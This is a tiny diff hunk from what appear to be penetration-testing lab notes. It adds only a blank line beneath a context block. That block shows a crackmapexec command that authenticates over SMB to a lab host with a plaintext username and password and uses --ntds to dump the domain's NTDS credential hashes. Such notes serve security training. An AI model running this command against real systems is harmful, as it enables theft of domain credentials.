@@ -95,3 +95,4 @@ Using an account with admin privileges:
 ```shell-session
 crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
 ```
+
